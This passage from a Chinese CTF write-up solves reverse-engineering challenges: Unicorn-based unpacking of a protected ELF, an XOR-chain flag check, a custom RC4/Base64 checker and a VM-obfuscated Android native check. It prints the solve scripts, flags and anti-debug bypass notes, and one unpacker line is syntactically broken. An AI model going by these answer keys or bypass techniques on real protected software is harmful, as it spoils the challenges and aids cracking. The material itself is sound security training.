    # punpcklbw xmm1,xmm1
    unpacked = []
    for x in xmm1[:8]:
        unpacked.extend([x, x])

    words = [unpacked[i * 2] | (unpacked[i * 2 + 1] << 8) for i in range(8)]
    shifted2 = [(x << 2) & 0xFFFF for x in words]
    shifted1 = [(x << 1) & 0xFFFF for x in words]

    # pblendw imm=2 selects word 1 from shifted1, others from shifted2.
    blended = [shifted1[i] if ((2 >> i) & 1) else shifted2[i] for i in range(8)]
    shr = [x >> 8 for x in blended]
    packed = [min(x, 0xFF) for x in shr] * 2
    masked = [a & b for a, b in zip(packed, ce90)]
    shuffled = [0 if (m & 0x80) else masked[m & 0x0F] for m in cfb0]

    return [(a ^ b) & 0xF for a, b in zip(cf60, shuffled)]

def main():
    so = SO_PATH.read_bytes()
    snapshot, rows = clean_rows_from_snapshot(SNAPSHOT_PATH)
    cache = derive_cache_bytes(rows)

    first = derive_first_half(so, cache)
    second = derive_second_half(so, cache)
    uuid = uuid_from_nibbles(first + second)

    print("[+] snapshot recoveryUuid:", snapshot["recoveryUuid"])
    print("[+] bridgeSeed:", snapshot["bridgeSeed"])
    print("[+] native-confirmed UUID:", uuid)
    print("[+] flag: H&NCTF{%s}" % uuid)

if __name__ == "__main__":
    main()

```

![Image](./images/img-051.png)

![Image](./images/img-052.png)

H&NCTF{8f9c2d71-6b5a-43e8-a1c4-0d9e7f2b6a13}



## 题目名称：shell

解题人：weixiao

解题过程：

`vmp_obf` 是 64 位 Linux ELF，动态依赖里有 `libYigodProtectSDK.so.0`，并且节区里出现了 `.cLf0`、`.cLf1` 这类保护器生成的节名。

```text
Entry point: 0x8299ea
NEEDED: libYigodProtectSDK.so.0
RUNPATH: $ORIGIN
.cLf0: 0x400e30, executable, file size 0
.cLf1: 0x600340, RWX, file size 0x299487
```

主程序一开始的入口和 `.cLf1` 里充满跳转与无意义指令，直接线性反汇编很乱。保护库里的 `VMProtectBeginVirtualization`、`VMProtectEnd` 等函数实际都是空壳，因此核心逻辑在主程序自解包后的代码里。

**动态脱壳思路**

用 Unicorn 模拟 ELF 启动流程：

1. 按 ELF `PT_LOAD` 段映射内存。

2. 手动处理 `R_X86_64_RELATIVE`、`GLOB_DAT`、`JUMP_SLOT`、`COPY` 重定位。

3. 给 `malloc/open/lseek/mmap/mprotect/free/dladdr` 等导入函数做 Python stub。

4. 从入口 `0x8299ea` 开始模拟。

5. 程序会读取自身文件，解密并写入空洞执行段。

6. 当执行流第一次回到恢复后的 `_start = 0x201880` 时 dump `0x200000-0x204000`。

脱壳时能观察到关键行为：

```text
malloc(0x160)
dladdr(...)
open(self)
lseek(fd, 0, SEEK_END) -> 2730573
mmap(self)
mprotect(0x400000, 0x14e81b, RWX)
...
mprotect(...)
jump 0x201880
```

dump 后，`0x201880` 已经恢复成正常 ELF `_start`，会调用 `__libc_start_main(0x201aa0, ...)`，所以真实 `main` 是 `0x201aa0`。

**真实主逻辑**

恢复后的 `main` 大致如下：

```c
int main() {
    char buf[0x80] = {0};

    puts("== H&NCTF 2026 :: vmp_obf ==");
    fwrite("flag> ", 1, 6, stdout);
    fflush(stdout);

    if (!fgets(buf, 0x80, stdin)) {
        puts("No input.");
        return 1;
    }

    strip_newline(buf);

    if (xor_chain_check(buf)) {
        puts("Correct!");
        return 0;
    }

    puts("Wrong.");
    return 1;
}
```

校验函数在 `0x2019c0`，关键逻辑如下：

```python
```c
ok = 1;
ok &= strlen(input) == 0x28;
ok &= input[*0..6*] == "H&NCTF{";
ok &= input[0x27] == '}';

prev = input[0];
for (i = 1; i < 0x28; i++) {
    cur = input[i];
    ok &= ((prev ^ cur) == table[i]);
    prev = cur;
}
```
```

```text

反汇编中对应的循环：

```asm
201a0c  movzx ecx, byte ptr [rbx]
201a0f  lea   rdi, [rip-0x12f7]  ; table = 0x20071f
201a2f  mov   eax, 1

201a40  mov   edx, ecx
201a42  movzx ecx, byte ptr [rbx+rax]
201a4a  xor   edx, ecx
201a4c  cmp   byte ptr [rdi+rax], dl
201a52  add   rax, 1
201a5f  cmp   rax, 0x28
201a63  jne   0x201a40
```

`rodata` 中的 XOR 表在 `0x20071f`：

```text
00 6e 68 0d 17 12 3d 03 17 1d 2d 3c 0b 09 08 07
31 29 1b 32 30 0d 04 39 3a 04 12 0a 26 2d 17 13
29 6d 02 02 04 17 00 5c
```

解题脚本

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import struct
from pathlib import Path

from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection
from unicorn import Uc, UcError, UC_ARCH_X86, UC_HOOK_CODE, UC_HOOK_MEM_INVALID, UC_MODE_64, UC_PROT_ALL
from unicorn.x86_const import (
    UC_X86_REG_R8,
    UC_X86_REG_R9,
    UC_X86_REG_RAX,
    UC_X86_REG_RCX,
    UC_X86_REG_RDI,
    UC_X86_REG_RDX,
    UC_X86_REG_RIP,
    UC_X86_REG_RSI,
    UC_X86_REG_RSP,
)

ROOT = Path(__file__).resolve().parent
BIN_PATH = ROOT / "vmp_obf"
LOW_DUMP = ROOT / "dump_low.bin"

PAGE = 0x1000
MAP_START = 0x100000
MAP_END = 0xB00000
LOW_BASE = 0x200000
LOW_SIZE = 0x4000
UNPACKED_START = 0x201880
UNPACKED_STOP = 0x2018A2

STACK_BASE = 0x700000000000
STACK_SIZE = 0x200000
STUB_BASE = 0x5000000000
HEAP_BASE = 0x6000000000

def p64(value: int) -> bytes:
    return struct.pack("<Q", value & ((1 << 64) - 1))

def u64(data: bytes) -> int:
    return struct.unpack("<Q", data)[0]

def align_down(value: int) -> int:
    return value & ~(PAGE - 1)

def align_up(value: int) -> int:
    return (value + PAGE - 1) & ~(PAGE - 1)

class Unpacker:
    def __init__(self, binary_path: Path):
        self.binary_path = binary_path
        self.binary = binary_path.read_bytes()
        self.stream = binary_path.open("rb")
        self.elf = ELFFile(self.stream)
        self.uc = Uc(UC_ARCH_X86, UC_MODE_64)
        self.fd_table = {3: {"data": self.binary, "pos": 0}}
        self.next_fd = 4
        self.next_heap = HEAP_BASE
        self.stub_by_name: dict[str, int] = {}
        self.name_by_stub: dict[int, str] = {}
        self.reached_unpacked_entry = False

        self._map(MAP_START, MAP_END - MAP_START)
        self._load_segments()
        self._map(STACK_BASE - STACK_SIZE, STACK_SIZE)
        self._setup_process_stack()
        self._setup_stubs()
        self._apply_relocations()

        self.uc.hook_add(UC_HOOK_CODE, self._hook_stub, None, STUB_BASE, STUB_BASE + 0x20000)
        self.uc.hook_add(UC_HOOK_CODE, self._hook_unpacked_entry, None, UNPACKED_START, UNPACKED_STOP)
        self.uc.hook_add(UC_HOOK_MEM_INVALID, self._hook_invalid_memory)

    def _map(self, address: int, size: int) -> None:
        try:
            self.uc.mem_map(align_down(address), align_up((address & (PAGE - 1)) + size), UC_PROT_ALL)
        except UcError:
            pass

    def _load_segments(self) -> None:
        for segment in self.elf.iter_segments():
            if segment["p_type"] != "PT_LOAD" or not segment["p_filesz"]:
                continue
            start = segment["p_offset"]
            end = start + segment["p_filesz"]
            self.uc.mem_write(segment["p_vaddr"], self.binary[start:end])

    def _setup_process_stack(self) -> None:
        sp = STACK_BASE - 0x1000
        strings = STACK_BASE - 0x8000
        self.program_path = str(self.binary_path).replace("\", "/").encode() + b"\x00"

        argv = strings + 0x100
        envp = strings + 0x200
        self.uc.mem_write(strings, self.program_path)
        self.uc.mem_write(argv, p64(strings) + p64(0))
        self.uc.mem_write(envp, p64(0))

        initial_sp = sp & ~0xF
        self.uc.mem_write(initial_sp, p64(1) + p64(argv) + p64(0) + p64(0) + p64(0))
        self.uc.reg_write(UC_X86_REG_RSP, initial_sp)

        self.argc = 1
        self.argv = argv
        self.envp = envp
        self.fake_stdin = 0x13370010
        self.fake_stdout = 0x13370020

    def _setup_stubs(self) -> None:
        self._map(STUB_BASE, 0x20000)
        names = [
            "__libc_start_main",
            "__gmon_start__",
            "_ITM_deregisterTMCloneTable",
            "_ITM_registerTMCloneTable",
            "_Unwind_Resume",
            "strlen",
            "VMProtectBeginVirtualization",
            "VMProtectEnd",
            "puts",
            "fwrite",
            "fflush",
            "fgets",
            "malloc",
            "fopen",
            "fclose",
            "dladdr",
            "open",
            "lseek",
            "close",
            "mmap",
            "munmap",
            "mprotect",
            "free",
            "exit",
            "readlink",
            "system",
        ]
        for index, name in enumerate(names):
            address = STUB_BASE + index * 0x10
            self.stub_by_name[name] = address
            self.name_by_stub[address] = name
            self.uc.mem_write(address, b"\xC3")

    def _stub_for_symbol(self, name: str) -> int:
        if name in self.stub_by_name:
            return self.stub_by_name[name]
        base_name = name.split("@")[0]
        if base_name in self.stub_by_name:
            return self.stub_by_name[base_name]
        address = STUB_BASE + len(self.stub_by_name) * 0x10
        self.stub_by_name[name] = address
        self.name_by_stub[address] = name
        self.uc.mem_write(address, b"\xC3")
        return address

    def _apply_relocations(self) -> None:
        for section in self.elf.iter_sections():
            if not isinstance(section, RelocationSection):
                continue
            symtab = self.elf.get_section(section["sh_link"])
            for relocation in section.iter_relocations():
                r_type = relocation["r_info_type"]
                offset = relocation["r_offset"]
                addend = relocation["r_addend"] if relocation.is_RELA() else 0

                if r_type == 8:  # R_X86_64_RELATIVE
                    self.uc.mem_write(offset, p64(addend))
                elif r_type in (6, 7):  # GLOB_DAT / JUMP_SLOT
                    symbol = symtab.get_symbol(relocation["r_info_sym"])
                    self.uc.mem_write(offset, p64(self._stub_for_symbol(symbol.name)))
                elif r_type == 5:  # COPY relocation for stdin/stdout
                    symbol = symtab.get_symbol(relocation["r_info_sym"])
                    if symbol.name.startswith("stdout"):
                        self.uc.mem_write(offset, p64(self.fake_stdout))
                    elif symbol.name.startswith("stdin"):
                        self.uc.mem_write(offset, p64(self.fake_stdin))
                    else:
                        self.uc.mem_write(offset, b"\x00" * symbol["st_size"])

    def c_string(self, address: int, limit: int = 0x10000) -> bytes:
        if not address:
            return b""
        result = bytearray()
        for index in range(limit):
            try:
                char = self.uc.mem_read(address + index, 1)[0]
            except UcError:
                break
            if char == 0:
                break
            result.append(char)
        return bytes(result)

    def _return(self, value: int = 0) -> None:
        rsp = self.uc.reg_read(UC_X86_REG_RSP)
        ret = u64(self.uc.mem_read(rsp, 8))
        self.uc.reg_write(UC_X86_REG_RSP, rsp + 8)
        self.uc.reg_write(UC_X86_REG_RAX, value & ((1 << 64) - 1))
        self.uc.reg_write(UC_X86_REG_RIP, ret)

    def _hook_unpacked_entry(self, uc: Uc, address: int, size: int, user_data) -> None:
        self.reached_unpacked_entry = True
        LOW_DUMP.write_bytes(bytes(uc.mem_read(LOW_BASE, LOW_SIZE)))
        uc.emu_stop()

    def _hook_stub(self, uc: Uc, address: int, size: int, user_data) -> None:
        name = self.name_by_stub.get(address)
        rdi = uc.reg_read(UC_X86_REG_RDI)
        rsi = uc.reg_read(UC_X86_REG_RSI)
        rdx = uc.reg_read(UC_X86_REG_RDX)
        rcx = uc.reg_read(UC_X86_REG_RCX)
        r8 = uc.reg_read(UC_X86_REG_R8)
        r9 = uc.reg_read(UC_X86_REG_R9)

        if name == "__libc_start_main":
            self._jump_to_main(rdi)
        elif name in {
            "__gmon_start__",
            "_ITM_deregisterTMCloneTable",
            "_ITM_registerTMCloneTable",
            "VMProtectBeginVirtualization",
            "VMProtectEnd",
            "_Unwind_Resume",
        }:
            self._return(0)
        elif name == "strlen":
            self._return(len(self.c_string(rdi)))
        elif name == "malloc":
            size = align_up(rdi or 1)
            address = self.next_heap
            self.next_heap += size + PAGE
            self._map(address, size)
            self._return(address)
        elif name == "free":
            self._return(0)
        elif name == "dladdr":
            info_name = STACK_BASE - 0x9000
            self.uc.mem_write(info_name, self.program_path)
            self.uc.mem_write(rsi, p64(info_name) + p64(LOW_BASE) + p64(0) + p64(0))
            self._return(1)
        elif name == "open":
            fd = self.next_fd
            self.next_fd += 1
            self.fd_table[fd] = {"data": self.binary, "pos": 0}
            self._return(fd)
        elif name == "lseek":
            fd = int(rdi)
            offset = rsi if rsi < (1 << 63) else rsi - (1 << 64)
            whence = rdx
            entry = self.fd_table.setdefault(fd, {"data": b"", "pos": 0})
            if whence == 0:
                position = offset
            elif whence == 1:
                position = entry["pos"] + offset
            elif whence == 2:
                position = len(entry["data"]) + offset
            else:
                position = -1
            entry["pos"] = position
            self._return(position)
        elif name == "mmap":
            fd = r8 if r8 < (1 << 63) else r8 - (1 << 64)
            address = align_down(rdi or self.next_heap)
            length = align_up(rsi)
            if not rdi:
                self.next_heap += length + PAGE
            self._map(address, length)
            if fd in self.fd_table and rsi:
                blob = self.fd_table[fd]["data"][r9 : r9 + rsi]
                self.uc.mem_write(address, blob + b"\x00" * max(0, rsi - len(blob)))
            self._return(address)
        elif name in {"close", "munmap", "mprotect", "fopen", "fclose", "fflush"}:
            self._return(0)
        elif name == "readlink":
            target = self.program_path[:-1]
            size = min(len(target), rdx)
            self.uc.mem_write(rsi, target[:size])
            self._return(size)
        elif name == "exit":
            uc.emu_stop()
        else:
            self._return(0)

    def _jump_to_main(self, main_address: int) -> None:
        rsp = (self.uc.reg_read(UC_X86_REG_RSP) - 8) & ~0xF
        self.uc.mem_write(rsp, p64(self.stub_by_name["exit"]))
        self.uc.reg_write(UC_X86_REG_RSP, rsp)
        self.uc.reg_write(UC_X86_REG_RDI, self.argc)
        self.uc.reg_write(UC_X86_REG_RSI, self.argv)
        self.uc.reg_write(UC_X86_REG_RDX, self.envp)
        self.uc.reg_write(UC_X86_REG_RIP, main_address)

    def _hook_invalid_memory(self, uc: Uc, access: int, address: int, size: int, value: int, user_data) -> bool:
        raise RuntimeError(f"invalid memory access at {address:#x}, rip={uc.reg_read(UC_X86_REG_RIP):#x}")

    def unpack(self) -> bytes:
        self.uc.emu_start(self.elf.header.e_entry, 0, timeout=180_000_000)
        if not self.reached_unpacked_entry:
            raise RuntimeError("unpacker did not reach the restored _start")
        return LOW_DUMP.read_bytes()

def recover_flag(low_dump: bytes) -> str:
    marker = b"== H&NCTF 2026 :: vmp_obf ==\x00"
    marker_offset = low_dump.find(marker)
    if marker_offset == -1:
        raise RuntimeError("cannot find rodata marker in low dump")

    first_nonzero = marker_offset + len(marker)
    while first_nonzero < len(low_dump) and low_dump[first_nonzero] == 0:
        first_nonzero += 1

    table_offset = first_nonzero - 1
    flag_length = 0x28
    table = low_dump[table_offset : table_offset + flag_length]
    if len(table) != flag_length:
        raise RuntimeError("xor table is truncated")

    flag = bytearray([ord("H")])
    for index in range(1, flag_length):
        flag.append(flag[-1] ^ table[index])

    if not flag.startswith(b"H&NCTF{") or flag[-1] != ord("}"):
        raise RuntimeError(f"recovered bytes do not look like a flag: {flag!r}")
    if any((flag[index - 1] ^ flag[index]) != table[index] for index in range(1, flag_length)):
        raise RuntimeError("xor-chain verification failed")

    return flag.decode()

def main() -> None:
    parser = argparse.ArgumentParser(description="Solve HNCTF2026 vmp_obf")
    parser.add_argument("--fresh", action="store_true", help="ignore existing dump_low.bin and unpack from vmp_obf")
    args = parser.parse_args()

    if args.fresh or not LOW_DUMP.exists():
        low_dump = Unpacker(BIN_PATH).unpack()
    else:
        low_dump = LOW_DUMP.read_bytes()

    print(recover_flag(low_dump))

if __name__ == "__main__":
    main()

```

![Image](./images/img-053.png)

H\&NCTF\{xor\_chain\_vm\_obf\_easy\_rev\_2026\!\!\}





## 题目名称：mov\~add\~ 

解题人：weixiao

解题过程：

题目的附件就只有一个二进制elf

字符串里面可以看到

```text
usage: ./hn_rc4_b64_re <flag>
Wrong!
Correct!
/proc/self/status
```

说明程序带有/proc/self/status的TracerPid反调试检查

**IDA 函数块总览**

|逻辑模块|IDA 实际函数/块|作用|
|---|---|---|
|程序入口|`main` `0x1A90`|参数检查，调用 checker，输出 `Correct!`/`Wrong!`|
|函数表初始化|`sub_10770`|初始化 `qword_12Cxx` 间接调用表|
|主校验流程|`sub_2710 -> sub_2C61 -> sub_2F01 -> sub_3281 -> sub_3466 -> sub_360C`|整体 flag 校验流程|
|失败返回块|`sub_2AC2`|格式失败等路径会跳到这里|
|格式检查|`sub_37D0` 及 `sub_3B85/sub_3D24/.../sub_5C69`|检查长度、前缀、后缀|
|key 写入|`sub_5C80`|写入 RC4 key|
|反调试|`sub_6EB0`|检查 `/proc/self/status` 的 `TracerPid`|
|输入预处理|`sub_6540 -> sub_6702 -> sub_6A7F -> sub_6D09`|对 24 字节输入做置换、异或、循环左移、加法|
|循环左移|`sub_FE90`|8\-bit rotate\-left|
|RC4|`sub_9D50 -> sub_9F19 -> sub_A29C -> sub_A443`|标准 RC4，部分中间块 IDA 未单独建函数|
|自定义 Base64|`sub_B840 -> sub_BA24 -> sub_BDD3 -> sub_C169 -> ... -> sub_DB83`|Base64 编码，使用自定义表|
|Base64 表生成|`sub_FED0 -> sub_10085 -> sub_10402 -> sub_105C0`|生成自定义 Base64 alphabet|
|目标串生成|`sub_DD40 -> sub_DEF5 -> sub_E272 -> sub_E43B`|从 `.rodata:0x6F0` 解出比较目标|
|比较噪声|`sub_E5E0`|比较循环中调用，不影响最终反解|

main函数

![Image](./images/img-054.png)

`checker` 不是直接明文调用，而是通过 `qword_12C28` 解密后的函数指针调用，实际入口是 `sub_2710`。

![Image](./images/img-055.png)

![Image](./images/img-056.png)

![Image](./images/img-057.png)

sub\_10770`是构造函数，会填充`qword\_12Cxx表

![Image](./images/img-058.png)

关键表项：

```text
qword_12C40 -> sub_37D0     ; 格式检查
qword_12C48 -> sub_5C80     ; 写 key
qword_12C50 -> sub_6EB0     ; 反调试
qword_12C58 -> sub_6540     ; 输入预处理
qword_12C60 -> sub_9D50     ; RC4
qword_12C68 -> sub_B840     ; 自定义 Base64
qword_12C70 -> sub_DD40     ; 目标串生成
qword_12C78 -> sub_E5E0     ; 比较循环噪声
qword_12C88 -> sub_FE90     ; rol8
qword_12CB0 -> sub_FED0     ; Base64 表生成
```

**sub\_2710**

这是 checker 入口。开头保存输入指针，然后通过 `qword_12C40` 调 `sub_37D0`：

**sub\_37D0**

返回值放到edx，后面用条件移动选择下一块：

**sub\_2C61**

这是格式正确后的继续块，主要做：



```text
1. 调 sub_5C80 写入 key 缓冲区
2. 调 sub_6EB0 做反调试
3. 准备后续转换用的栈缓冲区
```

这里能看到对 `qword_12C48` 的调用，也就是 `sub_5C80`：

![Image](./images/img-059.png)

key 内容是：

```text
H&NCTF-RC4-Base64-CFG-Key
```

**sub\_2F01**

这是主流程后半段的调度/循环条件块。它会把生成的 Base64 和目标串循环比较。

关键点是这里会根据计数器是否小于 `0x20` 选择：

```text
i < 32  -> sub_3281    ; 逐字节比较
i >= 32 -> sub_360C    ; 最终判断
```

**sub\_3281**

这是最终比较循环的核心块，定位最重要。

```asm language
3281: mov eax, [rbp-0BCh]          ; i
3287: movzx ecx, byte ptr [rbp+rax-90h]   ; 生成的 Base64
328F: movzx eax, byte ptr [rbp+rax-0B0h]  ; 目标串
3297: xor ecx, eax
3299: movzx eax, byte ptr [rbp-0B5h]
32A0: or eax, ecx
32A2: mov [rbp-0B5h], al           ; mismatch 累积
```

也就是说：

```text
[rbp-0x90] = sub_B840 生成的 32 字节自定义 Base64
[rbp-0xb0] = sub_DD40 生成的 32 字节目标串
```

比较后还会调用 `sub_E5E0`：

```asm language
32B8: mov rax, cs:qword_12C78
32CC: call rax                  ; sub_E5E0
```

但最终是否正确由 `[rbp-0xB5]` 的 mismatch 决定，`sub_E5E0` 不需要反

**sub\_37D0: 格式检查**

`sub_37D0` 是入口，但它也被拆成很多块：

```text
sub_37D0
sub_3B85
sub_3D24
sub_40A4
sub_4425
sub_47A6
sub_4B27
sub_4EA8
sub_5229
sub_55AA
sub_592B
sub_5ACA
sub_5C69
```

结论：

```text
长度必须是 24
格式必须是 H&NCTF{xxxxxxxxxxxxxxxx}
```

**sub\_5C80: RC4 key 写入**

`sub_5C80` 把 key 写入栈缓冲区，结果是：

```text
H&NCTF-RC4-Base64-CFG-Key
```

后面 `sub_9D50` 用它作为 RC4 key。

**sub\_6EB0: 反调试**

`sub_6EB0` 读取：

```text
/proc/self/status
```

并检查 `TracerPid`。这个函数只影响运行环境，不参与 flag 算法。分析时可以 patch 或 stub 掉。

**sub\_6540逻辑块链: 输入预处理**

这一层也不是只看 `sub_6540` 一个函数。IDA 实际块链：

```text
sub_6540  ; 初始化参数和局部变量
sub_6702  ; 循环条件 i < 24
sub_6A7F  ; 循环体核心变换
sub_6D09  ; i++ 并回到条件判断
```

核心变换在 `sub_6A7F` 附近。

正向逻辑：

```python
for i in range(24):
    idx = (5 * i + 11) % 24
    x = input[idx]
    x ^= (37 * i + seed + 0x5d) & 0xff
    x = rol8(x, (i % 7) + 1)
    x = (x + 19 * i - 0x41) & 0xff
    out[i] = x
```

`sub_2710` 调用它时 `seed = 0`。

**sub\_FE90**

`sub_FE90` 是 `sub_6540` 调用的小函数，做 8\-bit 循环左移：

```python
rol8(x, n) = ((x << n) | (x >> (8 - n))) & 0xff
```

反解时用 `ror8` 即可。

**sub\_9D50逻辑块链: RC4**

RC4 入口是 `sub_9D50`，后面也被拆块：

```text
sub_9D50  ; 初始化参数、局部 S 盒
sub_9F19  ; S[i] = i 的循环判断/调度
sub_A29C  ; S[i] = i 的循环体
sub_A443  ; 后续 KSA/PRGA 的调度块
```

IDA 中间还有一些未单独建函数的跳转位置，例如 `0xAB15` 附近，是 RC4 KSA 的核心逻辑。

算法是标准 RC4：

```text
KSA: 初始化并打乱 S[256]
PRGA: 生成 keystream
data[i] ^= keystream[i]
```

调用参数：

```text
data    = sub_6540 的 24 字节输出
length  = 0x18
key     = H&NCTF-RC4-Base64-CFG-Key
key_len = 0x19
```

RC4 加解密相同，反解时再跑一次 RC4。

**sub\_FED0逻辑块链: 自定义 Base64 表**

`sub_FED0` 构造 Base64 字母表，实际核心在 `sub_10402`。

块链：

```text
sub_FED0
sub_10085
sub_10402  ; 核心写表
sub_105C0
```

`sub_10402` 的逻辑：

```python
custom_table[i] = std_table[(13 * i + 7) & 0x3f]
```

标准表位于 `.rodata:0x6A0`：

```text
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
```

最终自定义表：

```text
HUhu7IViv8JWjw9KXkx+LYly/MZmzANan0BObo1CPcp2DQdq3ERer4FSfs5GTgt6
```

**sub\_B840逻辑块链: 自定义 Base64 编码**

`sub_B840` 是 Base64 编码入口。因为混淆，IDA 拆成了很多块：

```text
sub_B840  ; 入口，调用 sub_FED0 生成表
sub_BA24
sub_BDD3
sub_C169
sub_C324
sub_C4C1
sub_C844
sub_CA03
sub_CBA3
sub_CF7B
sub_D13A
sub_D2DD
sub_D673
sub_D82F
sub_D9D2
sub_DB83
```

入口处可以看到调用 `sub_FED0`：

```asm language
B864: mov rax, cs:qword_12CB0
B878: lea rdi, [rbp-60h]
B87C: call rax                  ; sub_FED0(custom_table)
```

编码方式仍是普通 Base64 的分组：

```text
3 字节 -> 24 bit -> 4 个 6-bit index
```

区别是查表时用 `sub_FED0` 生成的自定义表，不是标准表。

对本题正确路径中 `sub_9D50` 输出的 24 字节：

```text
ef6366a1240615e7d9f692d384533caa3c595b11a7a2c788
```

标准 Base64 会得到：

```text
72NmoSQGFefZ9pLThFM8qjxZWxGnoseI
```

但 `sub_B840` 得到：

```text
GFw1PxXVINaMgcW+0IjTpOEMlEVCPDNv
```

这就是一开始按标准 Base64 反不出来可打印 flag 的原因。

**sub\_DD40 逻辑块链: 目标串生成**

目标串入口是 `sub_DD40`，核心在 `sub_E272`。

块链：

```text
sub_DD40
sub_DEF5
sub_E272  ; 核心解目标串
sub_E43B
```

`.rodata:0x6F0` 有 32 字节：

```text
05 19 0b a8 e6 ab a8 5b 63 09 05 cc f9 d8 8f de
22 66 26 3d f6 ec 85 90 96 52 62 12 3e cf e6 b3
```

`sub_E272` 的核心逻辑：

```python
target[i] = rodata_6f0[i] ^ ((29 * i + 0x42) & 0xff)
```

得到比较目标：

```text
GFw1PxXVINaMgcW+0IjTpOEMlEVCPDNv
```

这个目标会放到 `sub_3281` 比较循环里的 `[rbp-0xB0]`。

解题脚本

```python
#!/usr/bin/env python3

STD_B64 = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
KEY = b"H&NCTF-RC4-Base64-CFG-Key"

# .rodata:0x6f0, used by fn_dd40 to rebuild the target string.
TARGET_ENC = bytes.fromhex(
    "05190ba8e6aba85b630905ccf9d88fde"
    "2266263df6ec8590965262123ecfe6b3"
)

def build_custom_b64_table():
    # fn_fed0 builds a shuffled base64 alphabet:
    # table[i] = STD_B64[(13 * i + 7) & 0x3f]
    return bytes(STD_B64[(13 * i + 7) & 0x3F] for i in range(64))

CUSTOM_B64 = build_custom_b64_table()

def recover_target():
    # fn_dd40 decodes the 32-byte compare target from .rodata:
    # target[i] = TARGET_ENC[i] ^ (29 * i + 0x42)
    return bytes(b ^ ((29 * i + 0x42) & 0xFF) for i, b in enumerate(TARGET_ENC))

def custom_b64_decode(s):
    rev = {c: i for i, c in enumerate(CUSTOM_B64)}
    out = bytearray()
    for i in range(0, len(s), 4):
        block = s[i : i + 4]
        pad = block.count(ord("="))
        vals = [0 if c == ord("=") else rev[c] for c in block]
        n = (vals[0] << 18) | (vals[1] << 12) | (vals[2] << 6) | vals[3]
        out.append((n >> 16) & 0xFF)
        if pad < 2:
            out.append((n >> 8) & 0xFF)
        if pad < 1:
            out.append(n & 0xFF)
    return bytes(out)

def custom_b64_encode(data):
    out = bytearray()
    for i in range(0, len(data), 3):
        block = data[i : i + 3]
        n = int.from_bytes(block.ljust(3, b"\x00"), "big")
        out.append(CUSTOM_B64[(n >> 18) & 0x3F])
        out.append(CUSTOM_B64[(n >> 12) & 0x3F])
        out.append(CUSTOM_B64[(n >> 6) & 0x3F] if len(block) > 1 else ord("="))
        out.append(CUSTOM_B64[n & 0x3F] if len(block) > 2 else ord("="))
    return bytes(out)

def rc4(data, key):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]

    i = 0
    j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 0xFF])
    return bytes(out)

def rol8(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xFF

def ror8(x, n):
    return ((x >> n) | (x << (8 - n))) & 0xFF

def transform_6540(flag):
    out = bytearray()
    for i in range(24):
        idx = (5 * i + 11) % 24
        x = flag[idx] ^ ((37 * i + 0x5D) & 0xFF)
        x = rol8(x, (i % 7) + 1)
        x = (x + 19 * i - 0x41) & 0xFF
        out.append(x)
    return bytes(out)

def invert_6540(data):
    flag = [0] * 24
    for i, b in enumerate(data):
        idx = (5 * i + 11) % 24
        x = (b - (19 * i - 0x41)) & 0xFF
        x = ror8(x, (i % 7) + 1)
        flag[idx] = x ^ ((37 * i + 0x5D) & 0xFF)
    return bytes(flag)

def main():
    target = recover_target()
    after_rc4 = custom_b64_decode(target)
    before_rc4 = rc4(after_rc4, KEY)
    flag = invert_6540(before_rc4)

    print("custom_b64 =", CUSTOM_B64.decode())
    print("target     =", target.decode())
    print("flag       =", flag.decode())

    check = custom_b64_encode(rc4(transform_6540(flag), KEY))
    print("verify     =", check.decode())
    assert check == target

if __name__ == "__main__":
    main()

```

![Image](./images/img-060.png)

H\&NCTF\{rc4\_b64\_cfg\_m4ze\}







## 题目名称：ezvm

解题人：weixiao

解题过程：

安装apk，白盒AES

![Image](./images/img-061.png)

JADX打开apk，先看mainactivity，flag的校验是在checkFlag里，而这个函数是在native层

![Image](./images/img-062.png)

转战native层，不是静态注册函数名，去看JNI\_OnLoad,找到off\_952A0，checkflag实际指向sub\_21B80函数

![Image](./images/img-063.png)

跳转过来，sub\_21B80不是校验函数，只是 VM wrapper：

![Image](./images/img-064.png)

继续看 `sub_2BAC0` 解释的 `0x17140` 字节码

这个函数也算是很长了，足足2100行，这里直接上结论

**VM 解释器结构**

主 VM `sub_2BAC0` 和二级 VM `sub_34D90` 是同一套模板，只是全局变量和字节码基址不同。

每个 basic block 开头是两个 dword seed：

```text
seed_op  = *(uint32_t *)(code + pc)
seed_arg = *(uint32_t *)(code + pc + 4)
pc += 8
```

后续 opcode 和 operand 都是按 byte 加密的。解密 seed 使用 xorshift32：

```python
def xs32(x):
    x &= 0xffffffff
    x ^= (x << 13) & 0xffffffff
    x ^= (x >> 17) & 0xffffffff
    x ^= (x << 5) & 0xffffffff
    return x & 0xffffffff
```

读 opcode 时：

```python
enc = code[pc]
pc += 1

seed_arg = xs32(seed_arg)
decoded = enc ^ (seed_arg & 0xff)
```

opcode 本身不是直接 `decoded`，还要用 `seed_op` 生成最多 16 个候选值：

```python
for k in range(16):
    seed_op = xs32(seed_op)
    if decoded == (seed_op & 0xff):
        opcode = k + 1
        break
```

跳转类 opcode 会改 `pc = target`，并设置重新进入 basic block。也就是说新 block 会重新读 8 字节 seed。

两个 VM 的跳表地址：

```text
main VM opcode table: 0x845c
char VM opcode table: 0x8508
```

主 VM 15 个 opcode 入口：

```text
1  -> 0x2bd55
2  -> 0x2c19f
3  -> 0x2c889
4  -> 0x2d0c5
5  -> 0x2df17
6  -> 0x2ef49
7  -> 0x2fd97
8  -> 0x33142
9  -> 0x34b8a
10 -> 0x346be
11 -> 0x30525
12 -> 0x33a20
13 -> 0x315ba
14 -> 0x31bbe
15 -> 0x32724
```

二级 VM 15 个 opcode 入口：

```text
1  -> 0x35025
2  -> 0x3546f
3  -> 0x35b59
4  -> 0x36395
5  -> 0x371e7
6  -> 0x38219
7  -> 0x39067
8  -> 0x3c412
9  -> 0x3de5a
10 -> 0x3d98e
11 -> 0x397f5
12 -> 0x3ccf0
